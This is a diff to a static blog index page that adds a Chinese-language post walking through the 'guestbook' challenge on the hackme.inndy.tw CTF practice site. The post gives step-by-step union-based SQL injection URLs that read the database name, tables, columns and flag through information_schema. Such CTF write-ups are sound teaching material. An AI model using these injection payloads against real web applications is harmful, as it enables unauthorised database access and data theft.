@@ -151,6 +151,86 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Guestbook" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/03/19/Guestbook/">Guestbook</a>
+    </h1>
+  
+
+        
+        <a href="/2020/03/19/Guestbook/" class="archive-article-date">
+  	<time datetime="2020-03-19T10:25:56.544Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new" target="_blank" rel="noopener">guestbook</a></h1><p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
+<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-1%20union%20select%201,2,3,4%20#</span><br><span class="line">&#x2F;&#x2F;id&#x3D;-1 是让前面的内容不显示</span><br></pre></td></tr></table></figure>
+<p>3被回显</p>
+<p>1.查看数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-1%20union%20select%201,2,database(),4%20#</span><br></pre></td></tr></table></figure>
+
+<p>数据库的名字<code>g8</code></p>
+<p>2.查看表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-1 union select 1,2,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),4#</span><br></pre></td></tr></table></figure>
+<p>发现有一个表 <code>flag</code></p>
+<p>3.测试表的字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-1 union select 1,2,(select column_name from information_schema.columns where table_name&#x3D;&#39;flag&#39; limit 1,1),4#</span><br></pre></td></tr></table></figure>
+<p>仍然显示<code>flag</code></p>
+<p>4.读取flag   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-1 union select 1,2,(select flag from flag limit 1,1),4#</span><br></pre></td></tr></table></figure>
+
+<p>得到flag!<br><a href="https://i.imgur.com/Jc9imGo.png" target="_blank" rel="noopener"></a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/03/19/Guestbook/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-myblog" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
